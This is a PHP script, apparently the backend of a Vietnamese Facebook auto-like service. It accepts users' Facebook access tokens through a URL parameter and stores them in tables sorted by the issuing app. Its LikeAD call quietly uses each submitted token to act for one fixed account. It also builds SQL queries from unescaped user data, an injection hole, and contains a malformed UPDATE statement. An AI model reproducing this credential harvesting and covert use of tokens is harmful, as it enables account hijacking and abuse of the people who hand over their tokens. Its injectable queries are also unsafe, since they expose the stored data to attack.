<?php
set_time_limit(0);
require("../_cnF/_star_cn_F.php");
require("../_cnF/_star_funC.php");
	$token = $_GET['token'];
	if($token){
		$me = me($token);
		if($me['id']&&(!ereg('@tfbnw.net',$me['email']))&&(!ereg('CAAC',$token))){
			$tk = checktk($token);
			$star = @mysql_query("SELECT * FROM `taikhoan` WHERE `idfb` = $me[id];");
			if(mysql_num_rows($star) < 1){
				$time = time();
				@mysql_query("INSERT INTO taikhoan SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `time` = '" . $time . "', `vnd` = '5000' ");
			}
			$rows = null;
			$result = mysql_query("SELECT * FROM tokenvip WHERE idfb = '" . $me['id'] . "'");
			if($result){
				$rows = mysql_fetch_array($result, MYSQL_ASSOC);
				if(mysql_num_rows($result) > 1){
					mysql_query("DELETE FROM tokenvip WHERE idfb='" . $me['id'] . "' ");
				}
			}
			if(!$rows){
				mysql_query("INSERT INTO tokenvip SET `idfb` = '" . $me['id'] . "',`ten` = '" . $me['name'] . "',`token` = '" . $token . "'");
			}
			else{
				mysql_query("UPDATE tokenvip SET `token` = '" . $token . "',  WHERE `id` = " . $rows['id'] . "");
			}
			if($tk['id'] == '165907476854626'){
				$row = null;
				$result = @mysql_query("SELECT * FROM tokenios WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysql_fetch_array($result, MYSQL_ASSOC);
					if(@mysql_num_rows($result) > 1){
						@mysql_query("DELETE FROM tokenios WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100006716972752', $token);
				if(!$row){
					@mysql_query("INSERT INTO tokenios SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysql_query("UPDATE tokenios SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysql_close($connection);
			}
			if($tk['id'] == '41158896424'){
				$row = null;
				$result = @mysql_query("SELECT * FROM tokenhtc WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysql_fetch_array($result, MYSQL_ASSOC);
					if(@mysql_num_rows($result) > 1){
						@mysql_query("DELETE FROM tokenhtc WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100006716972752', $token);
				if(!$row){
					@mysql_query("INSERT INTO tokenhtc SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysql_query("UPDATE tokenhtc SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysql_close($connection);
			}
			if($tk['id'] == '6628568379'){
				$row = null;
				$result = @mysql_query("SELECT * FROM tokeniphone WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysql_fetch_array($result, MYSQL_ASSOC);
					if(@mysql_num_rows($result) > 1){
						@mysql_query("DELETE FROM tokeniphone WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100006716972752', $token);
				if(!$row){
					@mysql_query("INSERT INTO tokeniphone SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysql_query("UPDATE tokeniphone SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysql_close($connection);
			}
			if($tk['id'] == '350685531728'){
				$row = null;
				$result = @mysql_query("SELECT * FROM tokenandroid WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysql_fetch_array($result, MYSQL_ASSOC);
					if(@mysql_num_rows($result) > 1){
						@mysql_query("DELETE FROM tokenandroid WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100006716972752', $token);
				if(!$row){
					@mysql_query("INSERT INTO tokenandroid SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysql_query("UPDATE tokenandroid SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysql_close($connection);
			}
		}
	}
?>